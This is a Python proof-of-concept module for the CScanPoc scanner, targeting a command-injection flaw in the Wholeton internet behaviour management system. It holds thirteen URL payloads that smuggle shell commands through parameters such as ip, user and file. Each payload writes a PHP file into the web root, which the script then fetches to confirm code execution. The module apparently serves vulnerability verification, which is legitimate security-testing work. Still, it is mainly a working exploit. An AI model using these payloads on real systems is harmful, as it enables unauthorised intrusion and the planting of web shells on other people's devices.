# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import urllib

class Vuln(ABVuln):
    vuln_id = 'wholeton_0001' # 平台漏洞编号，留空
    name = '惠尔顿上网行为管理系统命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-03-25'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '惠尔顿上网行为管理系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '093eb2d4-92e9-490d-8ee6-b7903ad837c2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()       
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0103644
            #No.2 http://www.wooyun.org/bugs/wooyun-2010-0103774
            #No.3 http://www.wooyun.org/bugs/wooyun-2010-0103676
            payloads = [
                "/base/stats/realtime/user_prohibit_internet.php?ip=1.1.1.1;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/stats/realtime/underLineUser.php?action="+urllib.quote('允许上网')+"&identifier[]=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/vpn/download_nodes.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/tpl/delectSSL.php?id=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/user/offLine.php?user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/vpn/uf.php?cmd=add&user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "/base/vpn/uf.php?cmd=del&user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "/base/vpn/uf.php?cmd=mod&user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/vpn/netgatedel.php?system=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "/base/vpn/rdpdel.php?appName=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "/base/vpn/userdel.php?userName=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "/base/networking/ipbindmac_gateway.php?gateway=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "/base/message/ajaxGoAuth.php?type=sms&ip=222222|echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/"
            ]
            for payload in payloads:
                filename = 'shell' + str(random.randint(1,10000000000)) + '.php'
                target = self.target + payload + filename
                code, head, body, errcode, final_url = hh.http(target)
                if code == 404:
                    continue
                target2 = self.target + filename
                code, head, body, errcode, final_url = hh.http(target2)

                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    #security_hole(target+' ==getshell>> '+target2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
